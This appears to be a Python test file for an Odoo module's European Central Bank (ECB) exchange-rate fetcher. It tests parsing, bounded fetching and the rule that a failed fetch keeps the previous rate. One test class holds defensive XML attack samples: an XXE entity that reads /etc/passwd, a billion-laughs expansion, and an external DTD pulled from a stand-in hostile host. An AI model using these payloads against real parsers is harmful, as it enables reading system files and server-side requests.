# -*- coding: utf-8 -*-
"""ECB rate source, admin side (#308).

The properties worth protecting are the ones whose failure is invisible:

1. **Fail intact.** A bad fetch must leave the previous rate standing. A zero,
   a placeholder or a partial row is worse than an old rate, because every
   consumer downstream treats it as authoritative (ARCHITECTURE_SECURITY §11).
2. **Bounded and deadline-checked.** An unbounded read of an external host is
   the gap #278/#283 closed for config-sync; re-opening it here would be a
   regression with a new file name.
3. **Backward compatible.** `sync_from_platform` RAISES on a non-whitelisted
   key, so sending the rate to a tenant running older code would fail EVERY
   sync for it -- and that channel carries licensing. A tenant that has not
   advertised support must receive a byte-identical payload.
4. **Never look AED up in the feed.** ECB does not publish it. Needing it is
   precisely the KeyError that made OCA's provider unusable here.
"""
import io
import xml.etree.ElementTree as ET
from unittest.mock import patch

from odoo.addons.ncollection_saas.models.exchange_rate import _ECB_URL
from odoo.tests import TransactionCase, tagged

_DOC = """<?xml version="1.0" encoding="UTF-8"?>
<gesmes:Envelope xmlns:gesmes="http://www.gesmes.org/xml/2002-08-01"
 xmlns="http://www.ecb.int/vocabulary/2002-08-01/eurofxref">
  <Cube><Cube time='2026-08-03'>
    <Cube currency='USD' rate='1.1535'/>
    <Cube currency='JPY' rate='170.1'/>
  </Cube></Cube>
</gesmes:Envelope>"""


@tagged("post_install", "-at_install")
class TestEcbParse(TransactionCase):
    """Parsing: anything not fully justified must be refused."""

    def setUp(self):
        super().setUp()
        self.Rate = self.env['ncollection.exchange.rate']

    def test_parses_date_and_usd(self):
        parsed = self.Rate._parse_ecb_usd(_DOC)
        self.assertIsNotNone(parsed)
        rate_date, usd = parsed
        self.assertEqual(str(rate_date), '2026-08-03')
        self.assertAlmostEqual(usd, 1.1535, places=6)

    def test_document_without_usd_is_refused(self):
        """ECB carries no AED; a doc we cannot use must not half-parse."""
        doc = _DOC.replace("currency='USD'", "currency='CHF'")
        self.assertIsNone(self.Rate._parse_ecb_usd(doc))

    def test_absurd_rate_is_refused(self):
        """A hostile response wearing a number must not reach a tenant's books."""
        self.assertIsNone(
            self.Rate._parse_ecb_usd(_DOC.replace("rate='1.1535'", "rate='9999'")))
        self.assertIsNone(
            self.Rate._parse_ecb_usd(_DOC.replace("rate='1.1535'", "rate='0'")))

    def test_non_numeric_rate_is_refused(self):
        self.assertIsNone(
            self.Rate._parse_ecb_usd(_DOC.replace("rate='1.1535'", "rate='n/a'")))

    def test_a_crafted_doc_cannot_pair_a_fresh_date_with_a_stale_rate(self):
        """Reproduced before it was fixed: returned ('2026-08-04', '1.08').

        Both halves pass every individual check -- 1.08 is inside the sanity
        band, the date is valid -- so nothing downstream could have noticed a
        six-year-old rate wearing today's date.
        """
        crafted = ("<Cube>"
                   "<Cube time='2020-01-01'><Cube currency='USD' rate='1.08'/></Cube>"
                   "<Cube time='2026-08-04'><Cube currency='JPY' rate='170.1'/></Cube>"
                   "</Cube>")
        parsed = self.Rate._parse_ecb_usd(crafted)
        self.assertIsNotNone(parsed)
        rate_date, usd = parsed
        self.assertEqual(str(rate_date), '2020-01-01',
                         "the USD rate was paired with a foreign date")
        self.assertAlmostEqual(usd, 1.08, places=6)

    def test_a_future_dated_document_is_refused(self):
        from odoo import fields as _f
        from datetime import timedelta
        future = _f.Date.to_string(_f.Date.today() + timedelta(days=5))
        self.assertIsNone(
            self.Rate._parse_ecb_usd(_DOC.replace("2026-08-03", future)))

    def test_garbage_is_refused_not_raised(self):
        self.assertIsNone(self.Rate._parse_ecb_usd('<not xml'))
        self.assertIsNone(self.Rate._parse_ecb_usd(''))
        self.assertIsNone(self.Rate._parse_ecb_usd(None))


@tagged("post_install", "-at_install")
class TestEcbXmlHardening(TransactionCase):
    """#309: entity-expansion protection must be OURS, not the runtime's.

    The #308 review found billion-laughs and XXE already rejected on the
    deployed image — but only because libexpat >= 2.4.0 rejects them, which
    nothing here selects, pins or documents. A base-image bump to an older or
    backported expat, or a switch to lxml for speed, removes that silently.
    These tests fail if the DOCTYPE guard is removed, so the protection can no
    longer disappear without someone noticing.
    """

    def setUp(self):
        super().setUp()
        self.Rate = self.env['ncollection.exchange.rate']

    def test_the_real_feed_still_parses(self):
        """The guard must not cost us the legitimate document."""
        parsed = self.Rate._parse_ecb_usd(_DOC)
        self.assertIsNotNone(parsed)
        self.assertAlmostEqual(parsed[1], 1.1535, places=6)

    def test_every_doctype_bearing_document_is_refused_BY_OUR_GUARD(self):
        """One rejection covers the whole family: a rate needs no DTD, and
        every entity attack requires one.

        Asserting only ``is None`` here would be worthless — on the CURRENT
        image libexpat rejects billion-laughs and XXE by itself, and the
        external-DTD payload returns None anyway because it carries no USD
        cube. Such a test passes with the guard deleted, which is precisely the
        incidental-protection trap #309 exists to close, rewritten as a test.

        So it asserts the REASON: the log must carry our DOCTYPE message, not
        expat's "input amplification factor" one. Delete the guard and this
        fails even on a runtime that would still block the attack.
        """
        attacks = {
            'internal entity': '<!DOCTYPE r [<!ENTITY a "boom">]><r>&a;</r>',
            'xxe file://':
                '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
            'billion laughs':
                '<!DOCTYPE l [<!ENTITY a "aa"><!ENTITY b "&a;&a;">]><l>&b;</l>',
            'external dtd': '<!DOCTYPE r SYSTEM "http://evil.example/x.dtd"><r/>',
            'doctype behind a comment': '<!-- ok --><!DOCTYPE r><r/>',
        }
        logger = 'odoo.addons.ncollection_saas.models.exchange_rate'
        for name, payload in attacks.items():
            with self.subTest(attack=name):
                with self.assertLogs(logger, level='WARNING') as captured:
                    self.assertIsNone(self.Rate._parse_ecb_usd(payload),
                                      "%s was not refused" % name)
                self.assertTrue(
                    any('DOCTYPE declaration is not allowed' in line
                        for line in captured.output),
                    "%s was refused, but NOT by our DOCTYPE guard — got: %s"
                    % (name, captured.output))

    def test_doctype_rejection_is_explicit_not_inherited_from_expat(self):
        """The guard itself must raise, independently of whatever the linked
        libexpat happens to do about entity amplification."""
        with self.assertRaises(ET.ParseError):
            self.Rate._parse_xml_no_doctype('<!DOCTYPE r><r/>')
        # ...and must stay out of the way of a clean document.
        root = self.Rate._parse_xml_no_doctype(_DOC)
        self.assertTrue(root.find('.//*[@currency="USD"]') is not None)

    def test_a_parse_failure_never_escapes_as_an_exception(self):
        """The cron contract is 'never raise, keep the previous rate'. A narrow
        except tuple made that depend on _fetch_ecb_document decoding with
        errors='replace': a lone surrogate raises UnicodeEncodeError, which is
        neither ParseError nor ExpatError."""
        self.assertIsNone(self.Rate._parse_ecb_usd('<r>\ud800</r>'))
        self.assertIsNone(self.Rate._parse_ecb_usd('\x00<r/>'))


@tagged("post_install", "-at_install")
class TestEcbFetchBounds(TransactionCase):
    """The read must stay bounded and deadline-checked."""

    def setUp(self):
        super().setUp()
        self.Rate = self.env['ncollection.exchange.rate']

    def _fetch(self, reader, status=200):
        """Run the real read loop against a reader we control."""
        import requests

        class _Resp:
            status_code = status
            headers = {}

            def close(self):
                pass

        resp = _Resp()
        Tenant = self.env['ncollection.tenant']
        self.patch(type(Tenant), '_recv_reader', staticmethod(lambda _r: reader))
        self.patch(requests, 'get', lambda *a, **k: resp)
        return self.Rate._fetch_ecb_document()

    def test_oversized_response_is_refused(self):
        """A body over the cap is dropped, not buffered into memory."""
        huge = io.BufferedReader(io.BytesIO(b'x' * (5 * 1024 * 1024)))
        self.assertIsNone(self._fetch(huge))

    def test_a_normal_body_is_read_whole(self):
        """The bound must not truncate a legitimate 15 KB feed."""
        self.assertIsNotNone(
            self.Rate._parse_ecb_usd(
                self._fetch(io.BufferedReader(io.BytesIO(_DOC.encode())))))

    def test_deadline_abandons_a_trickle_AND_actually_read_first(self):
        """The deadline must fire, and the reader must genuinely have been used.

        Asserting only "returned None" cannot tell a working deadline from a
        reader that was never called -- the exact hole that made an earlier
        deadline test prove nothing (#285).
        """
        calls = []

        class _Trickle(io.BufferedReader):
            def read1(self, n=-1):
                calls.append(n)
                return b'<'

        clock = [0.0]
        self.patch(type(self.env['ncollection.tenant']), '_read_clock',
                   staticmethod(lambda: clock[0]))

        reader = _Trickle(io.BytesIO(b'x' * 1024))

        def _tick(n=-1):
            calls.append(n)
            clock[0] += 40.0  # two ticks blow any 60s deadline
            return b'<'

        reader.read1 = _tick
        self.assertIsNone(self._fetch(reader))
        self.assertGreaterEqual(len(calls), 1, "deadline fired without ever reading")

    def test_no_bounded_reader_means_refuse_not_fall_back(self):
        """The fallback loops internally and undoes the bomb protection, so on a
        real external host it is not an acceptable degradation (#285's fallback
        was tolerable only against our own loopback)."""
        self.assertIsNone(self._fetch(None))

    def test_the_allowlisted_host_is_not_chased_off_by_a_redirect(self):
        """requests follows 30 redirects by default, which would silently move
        the fetch to a host nobody allowlisted."""
        import requests
        seen = {}

        class _Resp:
            status_code = 200
            headers = {}

            def close(self):
                pass

        def _get(url, **kw):
            seen.update(kw, url=url)
            return _Resp()

        Tenant = self.env['ncollection.tenant']
        self.patch(type(Tenant), '_recv_reader',
                   staticmethod(lambda _r: io.BufferedReader(io.BytesIO(b'<x/>'))))
        self.patch(requests, 'get', _get)
        self.Rate._fetch_ecb_document()
        self.assertEqual(seen.get('url'), _ECB_URL)
        self.assertFalse(seen.get('allow_redirects', True))

    def test_non_200_is_refused(self):
        reader = io.BufferedReader(io.BytesIO(_DOC.encode()))
        self.assertIsNone(self._fetch(reader, status=503))


@tagged("post_install", "-at_install")
class TestEcbFailIntact(TransactionCase):
    """§11: a failed fetch keeps the previous rate. No placeholder rows."""

    def setUp(self):
        super().setUp()
        self.Rate = self.env['ncollection.exchange.rate']

    def test_failed_fetch_keeps_the_previous_rate(self):
        old = self.Rate.create({'name': '2026-08-01', 'usd_per_eur': 1.10})
        self.patch(type(self.Rate), '_fetch_ecb_document', lambda s: None)
        self.assertFalse(self.Rate._refresh_ecb_rate())
        self.assertEqual(self.Rate._latest(), old, "previous rate was disturbed")
        self.assertEqual(len(self.Rate.search([])), 1, "a placeholder row appeared")

    def test_unparseable_response_writes_nothing(self):
        self.patch(type(self.Rate), '_fetch_ecb_document', lambda s: '<not xml')
        self.assertFalse(self.Rate._refresh_ecb_rate())
        self.assertFalse(self.Rate.search([]))

    def test_success_records_the_feeds_own_date(self):
        self.patch(type(self.Rate), '_fetch_ecb_document', lambda s: _DOC)
        rec = self.Rate._refresh_ecb_rate()
        self.assertEqual(str(rec.name), '2026-08-03')
        self.assertAlmostEqual(rec.usd_per_eur, 1.1535, places=6)

    def test_an_implausible_daily_move_is_refused(self):
        """A static band catches garbage; only a delta cap catches a plausible
        lie. 9.99 sits inside 0.1-10.0 and would misprice everything ~6x."""
        self.Rate.create({'name': '2026-08-01', 'usd_per_eur': 1.15})
        self.patch(type(self.Rate), '_fetch_ecb_document',
                   lambda s: _DOC.replace("rate='1.1535'", "rate='9.99'"))
        self.assertFalse(self.Rate._refresh_ecb_rate())
        self.assertAlmostEqual(self.Rate._latest().usd_per_eur, 1.15, places=6)

    def test_a_normal_daily_move_is_accepted(self):
        """The cap must not refuse an ordinary day, or the feed freezes."""
        self.Rate.create({'name': '2026-08-01', 'usd_per_eur': 1.14})
        self.patch(type(self.Rate), '_fetch_ecb_document', lambda s: _DOC)
        self.assertTrue(self.Rate._refresh_ecb_rate())

    def test_same_publication_date_does_not_churn(self):
        self.patch(type(self.Rate), '_fetch_ecb_document', lambda s: _DOC)
        first = self.Rate._refresh_ecb_rate()
        second = self.Rate._refresh_ecb_rate()
        self.assertEqual(first, second)
        self.assertEqual(len(self.Rate.search([])), 1)

    # ---- #310: the cron must ENQUEUE, never fetch on the cron thread --------

    def test_the_cron_enqueues_and_does_not_fetch_inline(self):
        """The whole point of #310.

        If the cron still performed the fetch, a slow external host would hold
        the cron thread for up to limit_time_real_cron -- an hour in prod, and
        UNBOUNDED in dev, where workers=0 means Odoo does not enforce it at all
        -- blocking every other platform cron behind it.

        Proved by making the fetch explode: the cron must complete anyway,
        because it never calls it. Asserting only "with_delay was called" would
        still pass if the fetch ALSO ran inline.
        """
        def explode(*args, **kwargs):
            raise AssertionError("the cron performed the outbound fetch inline")

        with patch.object(type(self.Rate), '_fetch_ecb_document', explode):
            with patch.object(type(self.Rate), 'with_delay') as delayed:
                self.Rate._cron_refresh_ecb_rate()

        self.assertTrue(delayed.called, "the cron must enqueue the refresh")
        self.assertEqual(
            delayed.call_args.kwargs.get('channel'), 'root.outbound',
            "outbound work must not share root.provisioning with provisioning, "
            "backup, fleet-migration and config-sync -- a stalled host would "
            "sit in a slot they need")
        self.assertEqual(
            delayed.call_args.kwargs.get('identity_key'), 'nc-ecb-refresh',
            "without an identity key a runner backlog stacks duplicate fetches "
            "against the same host")


@tagged("post_install", "-at_install")
class TestRatePayloadCompatibility(TransactionCase):
    """A tenant that has not advertised support must see today's payload."""

    def setUp(self):
        super().setUp()
        self.env['ncollection.exchange.rate'].create(
            {'name': '2026-08-03', 'usd_per_eur': 1.1535})
        self.tenant = self.env['ncollection.tenant'].create({
            'company_name': 'Rate Co',
            'database_name': 'rateco',
            'database_status': 'ready',
        })

    def test_old_tenant_gets_an_unchanged_payload(self):
        """The whole point: no new key reaches a tenant running older code."""
        self.tenant.config_sync_accepts_rate = False
        vals = self.tenant._config_sync_vals()
        self.assertNotIn('ecb_usd_per_eur', vals)
        self.assertNotIn('ecb_rate_date', vals)

    def test_advertised_tenant_gets_the_rate(self):
        self.tenant.config_sync_accepts_rate = True
        vals = self.tenant._config_sync_vals()
        self.assertAlmostEqual(vals['ecb_usd_per_eur'], 1.1535, places=6)
        self.assertEqual(vals['ecb_rate_date'], '2026-08-03')

    def test_capability_is_learned_from_the_response(self):
        self.assertFalse(self.tenant.config_sync_accepts_rate)
        self.tenant._record_sync_capabilities({'ok': True, 'accepts_rate': True})
        self.assertTrue(self.tenant.config_sync_accepts_rate)

    def test_a_response_without_the_marker_keeps_it_off(self):
        """An old tenant's response omits it -- that must stay 'do not send'."""
        self.tenant.config_sync_accepts_rate = True
        self.tenant._record_sync_capabilities({'ok': True})
        self.assertFalse(self.tenant.config_sync_accepts_rate)

    def test_a_junk_response_never_raises(self):
        for payload in (None, [], 'nope', {'accepts_rate': 'yes'}):
            self.tenant._record_sync_capabilities(payload)

    def test_a_failed_push_clears_the_capability_so_it_can_heal(self):
        """Otherwise the flag is a one-way ratchet: the platform re-sends the
        same doomed payload forever and LICENSING stops propagating with it."""
        self.tenant.config_sync_accepts_rate = True
        self.tenant._config_sync_record('transient', 'boom')
        self.assertFalse(self.tenant.config_sync_accepts_rate)

    def test_a_successful_push_leaves_the_capability_alone(self):
        self.tenant.config_sync_accepts_rate = True
        self.tenant._config_sync_record('ok')
        self.assertTrue(self.tenant.config_sync_accepts_rate)
